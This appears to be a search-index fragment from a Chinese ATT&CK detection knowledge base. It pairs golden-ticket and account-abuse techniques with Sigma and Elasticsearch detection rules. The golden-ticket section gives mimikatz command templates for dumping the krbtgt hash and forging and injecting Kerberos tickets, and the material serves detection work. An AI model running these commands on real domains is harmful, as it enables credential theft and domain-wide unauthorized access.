\u5728\u57df\u5185\u5176\u4ed6Client(\u7528\u6237\u673a\u5668)\u4e0a\u4f7f\u7528\u5176\u4ed6\u57df\u7ba1\u7406\u5458\u6765\u6293\u53d6krbtgt\u7528\u6237\u7684hash\u548csid(\u4f7f\u7528mimikatz.exe\u5de5\u5177)\uff0c\u8fd9\u91cc\u547d\u4ee4\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684\u3002\u4e5f\u53ef\u4ee5\u5229\u7528\u5176\u5b83\u65b9\u6cd5\u83b7\u53d6krbtgt\u7684NTML hash","title":"\u5bfc\u51fakrbtgt\u7528\u6237\u7684hash\u548csid(\u4f7f\u7528mimikatz.exe\u5de5\u5177)"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#client","text":"\u5728\u57df\u63a7\u4e0a\u9762\u6210\u529f\u6293\u53d6\u4e86hash\u548csid\uff0c\u5c06hash\u548csid\u590d\u5236\u5230\u5176\u4ed6\u57df\u5185\u673a\u5668\u4e2d\uff0c\u4e5f\u5c31\u662fClient\u7aef\uff0c\u7136\u540e\u5728mimikatz.exe\u6267\u884ckerberos::list\u67e5\u770b\u6211\u4eec\u5f53\u524d\u7684\u7968\u636e\u3002 \u5982\u679c\u5b58\u5728\u5176\u5b83\u51ed\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528kerberos::purge\u6e05\u9664\u5f53\u524d\u7528\u6237\u7968\u636e\u3002","title":"\u6e05\u9664\u81ea\u5df1Client\u7aef(\u57df\u5185\u5176\u4ed6\u673a\u5668)\u7684\u7968\u636e"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#tgt","text":"","title":"\u4f2a\u9020TGT\u7968\u636e"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_6","text":"mimikatz.exe \"kerberos::golden /domain:<\u57df\u540d> /sid:<\u57dfSID> /rc4:<KRBTGT NTLM Hash> /user:<\u4efb\u610f\u7528\u6237\u540d> /ptt\" exit","title":"\u65b9\u6cd5\u4e00"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_7","text":"dir \\\\ICBC.abcc.org\\c$\\","title":"\u9a8c\u8bc1\u653b\u51fb\u6548\u679c"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_8","text":"mimikatz# kerberos::gloden /domain:*.com /sid:<\u57dfSID> /krbtgt: <KRBTGT NTLM Hash> /user:<\u4efb\u610f\u7528\u6237\u540d> /ticket:test.kribi or mimikatz# kerberos::gloden /domain:*.com /sid: <\u57dfSID> /aes256: <KRBTGT aes256> /user: <\u4efb\u610f\u7528\u6237\u540d> /ticket:test.kribi","title":"\u65b9\u6cd5\u4e8c"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#kribi","text":"","title":"\u5bfc\u5165*.kribi\u6587\u4ef6"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_9","text":"","title":"\u9a8c\u8bc1\u662f\u5426\u6210\u529f"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_10","text":"\u6b63\u5e38\u65e5\u5fd7\u75d5\u8ff9 \u5f02\u5e38\u65e5\u5fd7\u75d5\u8ff9","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_11","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#sigma","text":"title: windows\u672c\u5730\u8d26\u6237\u64cd\u7eb5 description: win7\u6d4b\u8bd5 references: tags: T1550-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4624 #\u8d26\u6237\u767b\u5f55 Account domain: '*.*' #\u53ef\u53c2\u8003\u793a\u4f8b\u65e5\u5fd7\u8fdb\u884c\u7406\u89e3 selection2: EventID: 4672 #\u7279\u6b8a\u767b\u5f55 Account domain: _ #\u8d26\u6237\u57df\u4e3a\u7a7a timeframe: last 5s condition: all of them level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_12","text":"\u6700\u540e\uff0c\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0cmimikatz\u6700\u65b0\u7248\u672c\u5df2\u7ecf\u66f4\u65b0\u4fee\u590d\u4e86\u4e00\u4e0b\u95ee\u9898\uff0c\u901a\u8fc7\u4e0a\u8ff0\u6b64\u7279\u5f81\u68c0\u6d4b\u9ec4\u91d1\u7968\u636e\u53ef\u80fd\u4f1a\u4ea7\u751f\u8bef\u62a5\u6216\u8005\u6f0f\u6d1e\uff0c\u5efa\u8bae\u91c7\u7528\u504f\u5411\u6d41\u91cf\u4fa7\u7684\u68c0\u6d4b\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u601d\u8def\u5982\u4e0b\u3002 1.AS-REP\u8fd4\u56de\u7684Ticket\u5b57\u6bb5\u4e2d\uff0c\u867d\u7136\u7ecf\u8fc7krbtgt\u5bc6\u7801\u7684\u52a0\u5bc6\uff0c\u4f46\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u5bf9\u5176\u8ba1\u7b97\u552f\u4e00\u6458\u8981\u503c\u3002 2.\u8ddf\u8e2a\u6bcf\u4e00\u6b21\u7684AS-REP TGT\u7968\u636e\u9881\u53d1\uff0c\u8bb0\u5f55\u4e0bTicket Hash\uff0c\u5b58\u5165\u5217\u8868A\u3002 3.\u5bf9\u6bcf\u4e00\u6b21TGS-REQ\u4e2dTGT Hash\u8fdb\u884c\u786e\u8ba4\uff0c\u5224\u65ad\u8be5\u503c\u662f\u5426\u5b58\u5728\u4e8e\u5df2\u77e5\u9881\u53d1\u8fc7\u7684TGT\u5217\u8868A\u4e2d\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u5c5e\u4e8e\u4f2a\u9020\u7684TGT\uff0c\u5373\u9ec4\u91d1\u7968\u636e\u3002 4.\u5217\u8868A\u7684\u5185\u5bb9\u53ef\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0cTGT\u548cST\u7684\u9ed8\u8ba4\u6700\u5927\u6709\u6548\u671f\u90fd\u662f10\u5c0f\u65f6\u3002","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_13","text":"MITRE-ATT&CK-T1550-003 https://attack.mitre.org/techniques/T1550/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/","text":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002 \u6d4b\u8bd5\u6848\u4f8b \u591a\u4e2a\u7528\u6237\u540c\u65f6\u6216\u8005\u5728\u540c\u4e00\u5c0f\u65f6\u5185\u767b\u5f55\u5230\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u5728\u6211\u4eec\u89c2\u5bdf\u5230\u7684\u7f51\u7edc\u4e2d\u3002 \u767b\u5f55\u4e8b\u4ef6\u662f\u9002\u7528\u4e8eWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684Windows\uff0c\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\u3002\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\u3002Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a4634\uff0cVista\u4e4b\u524d\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a538\u3002\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Microsoft\u7684\u201c \u5ba1\u6838\u767b\u5f55\u4e8b\u4ef6\u201d \u9875\u9762\u4e0a\u7684\u201c\u767b\u5f55\u7c7b\u578b\u201d\u8868\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u5173\u6ce8windows\u767b\u9646\u4e8b\u4ef6\uff0c\u5e76\u7559\u610f\u767b\u9646\u7c7b\u578b\u3002\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\uff1b\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\uff1b\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def es\u89c4\u5219 \u601d\u8def\uff1a\u7edf\u8ba1\u5728\u4e00\u5c0f\u65f6\u5185\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u5927\u4e8e\u4e00\u4e2a users_list = search UserSession:Login users_grouped = group users_list by hostname users_grouped = from users_grouped select min(time) as earliest_time, max(time) as latest_time count(user) as user_count multiple_logins = filter users_grouped where (latest_time - earliest_time <= 1 hour and user_count > 1) output multiple_logins \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#t1078-003-windows-","text":"","title":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002 \u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_1","text":"\u591a\u4e2a\u7528\u6237\u540c\u65f6\u6216\u8005\u5728\u540c\u4e00\u5c0f\u65f6\u5185\u767b\u5f55\u5230\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u5728\u6211\u4eec\u89c2\u5bdf\u5230\u7684\u7f51\u7edc\u4e2d\u3002 \u767b\u5f55\u4e8b\u4ef6\u662f\u9002\u7528\u4e8eWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684Windows\uff0c\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\u3002\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\u3002Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a4634\uff0cVista\u4e4b\u524d\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a538\u3002\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Microsoft\u7684\u201c \u5ba1\u6838\u767b\u5f55\u4e8b\u4ef6\u201d \u9875\u9762\u4e0a\u7684\u201c\u767b\u5f55\u7c7b\u578b\u201d\u8868\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_4","text":"\u5173\u6ce8windows\u767b\u9646\u4e8b\u4ef6\uff0c\u5e76\u7559\u610f\u767b\u9646\u7c7b\u578b\u3002\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\uff1b\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\uff1b\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#es","text":"\u601d\u8def\uff1a\u7edf\u8ba1\u5728\u4e00\u5c0f\u65f6\u5185\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u5927\u4e8e\u4e00\u4e2a users_list = search UserSession:Login users_grouped = group users_list by hostname users_grouped = from users_grouped select min(time) as earliest_time, max(time) as latest_time count(user) as user_count multiple_logins = filter users_grouped where (latest_time - earliest_time <= 1 hour and user_count > 1) output multiple_logins","title":"es\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_7","text":"MITRE-ATT&CK-T1078-003 https://attack.mitre.org/techniques/T1078/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/","text":"T1078-003-win-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u884c\u4e3a \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7a83\u53d6\u7684\u51ed\u636e\u7ed5\u8fc7\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u751a\u81f3\u53ef\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u548c\u5916\u90e8\u53ef\u7528\u670d\u52a1\uff08\u5982VPN\u3001Outlook Web Access\u548c\u8fdc\u7a0b\u684c\u9762\uff09\u7684\u6301\u4e45\u8bbf\u95ee\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u901a\u8fc7\u7a83\u53d6\u7684\u51ed\u636e\u83b7\u5f97\u7279\u5b9a\u7cfb\u7edf\u7684\u66f4\u591a\u6743\u9650\u6216\u7f51\u7edc\u53d7\u9650\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0d\u5c06\u6076\u610f\u8f6f\u4ef6\u6216\u5de5\u5177\u4e0e\u8fd9\u4e9b\u51ed\u636e\u63d0\u4f9b\u7684\u5408\u6cd5\u8bbf\u95ee\u7ed3\u5408\u4f7f\u7528\uff0c\u8fd9\u6837\u5c31\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u7684\u5b58\u5728\u3002 \u9ed8\u8ba4\u8d26\u53f7\u5e76\u4e0d\u9650\u4e8e\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u7684\u8bbf\u5ba2\u548c\u7ba1\u7406\u5458\uff0c\u5b83\u4eec\u8fd8\u5305\u62ec\u4e3a\u8bbe\u5907\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u548c\u8ba1\u7b97\u673a\u5e94\u7528\uff09\u9884\u8bbe\u7684\u8d26\u53f7\uff0c\u65e0\u8bba\u8fd9\u4e9b\u8bbe\u5907\u662f\u5185\u90e8\u7684\u3001\u5f00\u6e90\u7684\u8fd8\u662fCOTS\u3002\u5982\u679c\u8bbe\u5907\u9884\u8bbe\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u800c\u4e14\u5b89\u88c5\u540e\u4e0d\u66f4\u6539\uff0c\u5c06\u4f1a\u5bf9\u7ec4\u7ec7\u6784\u6210\u4e25\u91cd\u5a01\u80c1\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002\u540c\u7406\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4f1a\u5229\u7528\u516c\u5f00\u62ab\u9732\u7684\u79c1\u94a5\u6216\u76d7\u53d6\u7684\u79c1\u94a5\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5408\u6cd5\u5730\u8fde\u63a5\u5230\u8fdc\u7a0b\u73af\u5883\u3002 \u6211\u4eec\u9700\u8981\u5173\u6ce8\u8de8\u7cfb\u7edf\u7f51\u7edc\u7684\u8d26\u53f7\u8bbf\u95ee\u3001\u51ed\u636e\u548c\u6743\u9650\u7684\u91cd\u53e0\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e5f\u8bb8\u80fd\u591f\u8de8\u8d26\u53f7\u548c\u7cfb\u7edf\u5207\u6362\u4ee5\u83b7\u5f97\u8f83\u9ad8\u7684\u8bbf\u95ee\u7ea7\u522b\uff08\u57df\u6216\u4f01\u4e1a\u7ba1\u7406\u5458\uff09\uff0c\u4ece\u800c\u7ed5\u8fc7\u4f01\u4e1a\u5185\u8bbe\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7 / win2008+\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u5e10\u6237\u7be1\u6539-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u539f\u56e0 description: \u6b64\u65b9\u6cd5\u5bf9\u5931\u8d25\u7684\u767b\u5f55\u4f7f\u7528\u4e0d\u5e38\u89c1\u7684\u9519\u8bef\u4ee3\u7801\u6765\u786e\u5b9a\u53ef\u7591\u6d3b\u52a8\u5e76\u7be1\u6539\u5df2\u7981\u7528\u6216\u53d7\u67d0\u79cd\u65b9\u5f0f\u9650\u5236\u7684\u5e10\u6237\u3002 author: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1) date: 2020/06/09 references: - https://twitter.com/SBousseaden/status/1101431884540710913 tags: - attack.persistence - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection: EventID: - 4625 #\u666e\u901a\u8d26\u6237\u767b\u5f55\u5931\u8d25 - 4776 #\u57df\u8d26\u6237\u767b\u5f55\u5931\u8d25 Status: - '0xC0000072' # \u7528\u6237\u767b\u5f55\u5230\u5e10\u6237\u5df2\u88ab\u7ba1\u7406\u5458\u7981\u7528 - '0xC000006F' # \u7528\u6237\u5728\u6388\u6743\u65f6\u95f4\u4e4b\u5916\u767b\u5f55 - '0xC0000070' # \u7528\u6237\u4ece\u672a\u7ecf\u6388\u6743\u7684\u5de5\u4f5c\u7ad9\u767b\u5f55 - '0xC0000413' # \u767b\u5f55\u5931\u8d25\uff1a\u60a8\u767b\u5f55\u7684\u8ba1\u7b97\u673a\u53d7\u5230\u8eab\u4efd\u9a8c\u8bc1\u9632\u706b\u5899\u7684\u4fdd\u62a4\u3002 \u6307\u5b9a\u7684\u5e10\u6237\u4e0d\u5141\u8bb8\u5bf9\u8ba1\u7b97\u673a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1 - '0xC000018C' # \u767b\u5f55\u8bf7\u6c42\u5931\u8d25\uff0c\u56e0\u4e3a\u4e3b\u57df\u548c\u53ef\u4fe1\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u5931\u8d25 - '0xC000015B' # \u7528\u6237\u5c1a\u672a\u5728\u6b64\u8ba1\u7b97\u673a\u4e0a\u88ab\u6388\u4e88\u8bf7\u6c42\u7684\u767b\u5f55\u7c7b\u578b\uff08\u4e5f\u79f0\u4e3a\u767b\u5f55\u6743\u9650\uff09 condition: selection falsepositives: - \u4f7f\u7528\u7981\u7528\u5e10\u6237\u7684\u7528\u6237 level: high \u6ce8\u610f\uff1a\u6b64\u89c4\u5219\u4e3b\u8981\u662f\u9488\u5bf9\u7528\u6237\u8d26\u6237\u767b\u5f55\u5931\u8d25\u884c\u4e3a\u72b6\u6001\u7801\u8fdb\u884c\u5206\u6790\u3002 \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1078-003 